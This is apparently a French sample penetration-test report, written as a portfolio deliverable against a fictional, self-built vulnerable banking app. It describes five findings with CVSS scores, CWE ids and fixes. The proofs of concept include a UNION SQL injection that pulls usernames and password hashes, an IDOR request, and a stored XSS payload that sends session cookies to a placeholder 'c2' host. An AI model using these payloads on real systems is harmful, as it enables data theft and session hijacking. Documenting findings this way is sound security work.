Rapport de test d'intrusion

      
Un exemple de livrable, sur une cible fictive volontairement vulnérable (« VulnBank ») que j'ai montée moi-même. Objectif : montrer comment je documente, pas seulement comment j'exploite.

    


    

      
ClientVulnBank Demo S.A. (fictif)

      
Périmètrehttps://app.vulnbank.local — application web + API

      
TypeBoîte grise, authentifié + non authentifié

      
Dates2026-03-02 → 2026-03-09

      
Version1.0 — SAKOI Dominique-Savio

    


    

      
1Critique

      
2Élevé

      
1Moyen

Synthèse exécutive

    
Cinq vulnérabilités ont été identifiées, dont une critique permettant l'exfiltration complète de la base clients via injection SQL, et deux élevées (accès horizontal aux comptes tiers, et exécution de script stocké). Une chaîne réaliste mène d'un simple champ de recherche à la compromission des données de tous les utilisateurs. Les correctifs proposés sont standards et peu coûteux ; priorité absolue au finding VB-01.


    
Findings


    

      CRITIQUEVB-01Injection SQL non authentifiée (recherche produit)CVSS 9.8
      

        
CVSS 3.1AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H — 9.8

        
CWECWE-89 — SQL Injection

        
AffectéGET /api/products?q=

        
Le paramètre q est concaténé directement dans la requête SQL. Un attaquant non authentifié peut lire n'importe quelle table, dont users (identifiants, hachages, PII).

        
PoC
GET /api/products?q=x' UNION SELECT username,password_hash,email,4,5 FROM users-- -

HTTP/1.1 200 OK
[{"name":"admin","desc":"$2b$10$Rk...","price":"admin@vulnbank.local"}, ...]

        
RemédiationRequêtes paramétrées (prepared statements) ; principe du moindre privilège sur le compte SQL applicatif ; WAF en défense en profondeur.

      

    


    

      ÉLEVÉVB-02Référence directe non sécurisée (IDOR) sur les relevésCVSS 8.1
      

        
CVSS 3.1AV:N/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N — 8.1

        
CWECWE-639 — Authorization Bypass Through User-Controlled Key

        
AffectéGET /api/accounts/{id}/statement

        
L'identifiant de compte est séquentiel et n'est pas vérifié contre l'utilisateur authentifié : incrémenter {id} expose les relevés d'autres clients.

        
PoC
# connecté en tant que user 1041, on lit le compte 1042
GET /api/accounts/1042/statement   → 200 OK (relevé d'un autre client)

        
RemédiationContrôle d'autorisation côté serveur (l'objet appartient-il à l'appelant ?) ; identifiants non devinables (UUID).

      

    


    

      ÉLEVÉVB-03XSS stocké dans le libellé de virementCVSS 7.4
      

        
CVSS 3.1AV:N/AC:L/PR:L/UI:R/S:C/C:H/I:L/A:N — 7.4

        
CWECWE-79 — Stored XSS

        
AffectéPOST /api/transfers (champ label)

        
Le libellé d'un virement est rendu sans échappement dans le back-office. Un attaquant exécute du JavaScript dans la session d'un conseiller qui consulte l'historique.

        
PoC
label = <img src=x onerror=fetch('//c2/'+document.cookie)>

        
RemédiationÉchappement contextuel à la sortie ; Content-Security-Policy sans unsafe-inline ; cookie HttpOnly.

      

    


    

      MOYENVB-04JWT : algorithme non figé (risque de confusion)CVSS 6.5
      

        
CVSS 3.1AV:N/AC:H/PR:L/UI:N/S:U/C:H/I:H/A:N — 6.5

        
CWECWE-347 — Improper Verification of Cryptographic Signature

        
L'API accepte l'algorithme déclaré dans l'en-tête du jeton. Un attaquant peut tenter alg:none ou une confusion RS256→HS256 (clé publique utilisée comme secret HMAC).

        
PoC
# démontrable en direct sur mon labo :
sakoi-cyber.me/labo.html → onglet JWT

        
RemédiationFiger l'algorithme attendu côté serveur ; rejeter explicitement none ; clés séparées par usage.

      

    


    

      FAIBLEVB-05En-têtes de sécurité HTTP manquantsCVSS 3.7
      

        
CVSS 3.1AV:N/AC:H/PR:N/UI:N/S:U/C:L/I:L/A:N — 3.7

        
CWECWE-693 — Protection Mechanism Failure

        
Absence de HSTS, CSP, X-Content-Type-Options, Referrer-Policy. Réduit la défense en profondeur contre XSS, clickjacking et downgrade.

        
PoC
# vérifiable avec mon scanner :
sakoi-cyber.me/scan.html → app.vulnbank.local

        
RemédiationAjouter HSTS, CSP, X-Content-Type-Options:nosniff, Referrer-Policy, Permissions-Policy.
